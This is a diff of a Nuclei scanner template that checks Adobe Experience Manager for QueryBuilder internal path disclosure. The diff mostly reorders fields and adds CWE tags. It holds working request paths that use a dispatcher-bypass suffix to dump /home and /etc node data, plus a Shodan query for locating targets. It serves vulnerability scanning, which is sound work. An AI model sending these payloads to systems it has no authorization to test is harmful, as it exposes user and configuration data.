@@ -1,5 +1,4 @@
 id: aem-querybuilder-internal-path-read
-
 info:
   name: AEM QueryBuilder Internal Path Read
   author: DhiyaneshDk
@@ -8,33 +7,31 @@ info:
   reference:
     - https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide=91
   classification:
+    cwe-id:
+      - CWE-22
+      - CWE-73
     cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
   metadata:
     max-request: 4
-    vendor: adobe
     product: experience_manager
     shodan-query: http.component:"Adobe Experience Manager"
+    vendor: adobe
   tags: aem,misconfig,vuln
-
 http:
-  - method: GET
+  - matchers:
+      - status:
+          - 200
+        type: status
+      - condition: and
+        type: word
+        words:
+          - jcr:path
+          - success
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1'
       - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1'
       - '{{BaseURL}}/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1'
       - '{{BaseURL}}/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1'
-
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - 'jcr:path'
-          - 'success'
-        condition: and
-
